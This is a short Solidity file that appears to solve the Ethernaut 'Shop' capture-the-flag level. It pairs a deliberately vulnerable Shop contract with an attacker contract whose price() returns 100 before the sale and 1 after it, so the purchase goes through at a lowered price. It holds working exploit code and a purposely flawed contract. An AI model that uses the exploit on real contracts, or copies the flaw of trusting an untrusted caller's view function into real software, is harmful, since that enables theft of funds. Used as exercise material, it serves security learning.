// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0xEF6691b706876195C3128008e3708D6e96d0c000
// lower the price variable

interface Buyer {
  function price() external view returns (uint);
}

contract Sol {

    Shop shop;

    function setShop(address _shop) external {
      shop = Shop(_shop);
    }

    function callShop() external {
      shop.buy();
    }

    function price() external view returns(uint){
      return shop.isSold()? 1: 100;
    }
}


contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}